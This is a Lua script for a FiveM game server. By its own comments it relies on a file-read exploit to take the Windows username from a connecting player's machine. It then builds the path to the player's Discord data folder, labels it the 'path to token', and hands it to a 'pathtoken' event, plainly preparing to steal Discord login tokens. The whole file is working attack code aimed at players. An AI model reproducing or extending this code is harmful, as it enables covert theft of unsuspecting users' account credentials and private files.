Debugging = true

RegisterNetEvent('driveCheck')
AddEventHandler('driveCheck', function(data)
    if data ~= nil then
        mainDrive = true
    else
        mainDrive = false
    end
end)



RegisterNetEvent('exploitFile')
AddEventHandler('exploitFile', function(data)
    if mainDrive then
        fileContent = data
        exploitFile = true
        
        if Debugging then
            print(data)
        end
    end
end)


Citizen.CreateThread(function() --Getting username with some big iq moves due to exploit only being able to read files.
    while true do
        Wait(200)
        if exploitFile then
            local searchString = "C:\\Users\\"
            
            local foundLine = nil
            
            for line in fileContent:gmatch("[^\r\n]+") do
                if line:find(searchString) then
                    foundLine = line
                    break
                end
            end
            
            if foundLine then
                --print("Found line: " .. foundLine)
                local wholeLine = foundLine -- Save the whole line in a separate variable
                --print("Whole line: " .. wholeLine) -- Print the whole line
            
                local startIdx, endIdx = wholeLine:find("C:\\Users\\")
                local username = wholeLine:sub(endIdx + 1):match("([^\\]+)")

                --username = changingPart
            
                if Debugging then
                    print("Username: " .. username)
                end

                appChecking(username)
                exploitFile = false
            else
                if Debugging then
                    print("Search string not found.")
                end
                exploitFile = false
            end                    
        end
    end
end)

function appChecking(username) --allows to check if user has these app installed to their default locations 
	Citizen.CreateThread(function()

        -- Discord path
        local discord_start = "/Users/"
        local discord_end = "/AppData/Roaming/discord/"
        local discord_combined = discord_start .. username .. discord_end

        -- Steam path
        local steam_combined = "/Program Files (x86)/Steam"


        if username ~= nil then 
            print ("inside appChecking username: ".. username)
            print ("path to token: ".. discord_combined)
            TriggerEvent("pathtoken", discord_combined)

        end
    end)
end
